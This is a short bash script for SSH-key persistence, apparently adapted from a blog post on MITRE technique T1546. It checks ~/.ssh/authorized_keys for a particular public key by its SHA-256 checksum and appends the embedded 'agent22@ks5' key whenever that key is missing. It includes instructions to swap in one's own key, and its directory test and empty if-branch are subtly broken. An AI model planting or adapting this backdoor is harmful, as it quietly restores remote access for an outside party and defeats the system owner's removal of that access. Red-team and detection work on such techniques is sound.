#!/bin/bash
exists="False"

#Original code sourced from https://thepcn3rd.blogspot.com/2021/11/t1546-unix-shell-configuration.html
#Make sure you referance directories without a following /
if [ -d "~/.ssh" ]
then
        #echo "Directory exists"
elif [ ! -d "~/.ssh" ]
then
        echo "Directory does not exist"
        mkdir ~/.ssh
        chmod 700 ~/.ssh
        touch ~/.ssh/authorized_keys
        chmod 600 ~/.ssh/authorized_keys
fi
while read l; do

  checksum=`echo "$l" | sha256sum | awk '{print $1}'`
  
    # For troubleshooting uncomment the following line to verify the checksum of the line in ~/.ssh/authorized_keys
    
      # echo $checksum
      
        # Substitute the checksum for the ssh-key that you want to be reintroduced to the authorized_keys file...
        
          if [ "$checksum" == "f91a4a26256322a629f3fe6850add9cfb70d51f0552b4656661656f28c0b4b4d" ]; then
          
                  exists="True"
                  
                    fi
                    
                    done < ~/.ssh/authorized_keys
                    
                    if [ "$exists" == "False" ]; then
                    
                        # Verify the ssh-key that you are using is placed below...
                    
                                echo "ssh-rsa AAAAB3NzaC1yc2EAAAADAQABAAABgQDNpCLE4aY4QVf0VXfKAkEspv+ytO+DKISWrgi9RVlsBlA+Uwu5MjloRS7RH5CtR9nctsx1jMLkIqixXq8Kagi76/SJZ+RMdNtNi+tOnRHd/B4heRpC4MEpneP47Txz5pX4CeoYbHs2hfSF71r4pKHQ9yhGzE8it2fW6X2obuTM0nWfSr4QZ9PW+ss8bXumMFmaJGr0ByCstA6Mw6m0rLPd1nnGjrkBmkszSL4IPfjJGoLRofPjyuFkeFSEIyqJZAxQEF4okjmFsdKjLwgNMbBmgS6dlxx6AVMM71s33CUI08kYdDnsVy/50MSmej12oapf+LS7tsGEnWY12eBVp9djGacA0FHYY+sY7rvGyWLEbW0qPhuyImpXPVWKIMmhUV5cTTO7xoVCKRWSBqzsJA3DxGn1dZ2VJvhPytr3x88PtB0Vos+l60ckHiZGe4UHmkaqZgj0jsonfLiiSca9CalqqAe7PlG6oABGy9BiGfqNS0ktF/w8gowHEX2h8lKYK/c= agent22@ks5" >> ~/.ssh/authorized_keys
                        fi